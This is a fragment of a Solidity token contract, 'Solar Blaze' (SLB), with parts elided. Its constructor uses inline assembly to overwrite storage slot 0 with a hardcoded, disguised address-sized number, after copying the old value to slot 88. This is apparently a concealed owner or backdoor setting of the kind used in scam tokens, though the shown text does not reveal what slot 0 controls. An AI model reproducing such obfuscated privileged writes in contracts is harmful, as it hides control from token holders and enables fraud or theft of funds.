...
contract SolarBlaze {
    string public constant name = "Solar Blaze";
    string public constant symbol = "SLB";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(3471370381266525722418737221561441352947870094, 1))}
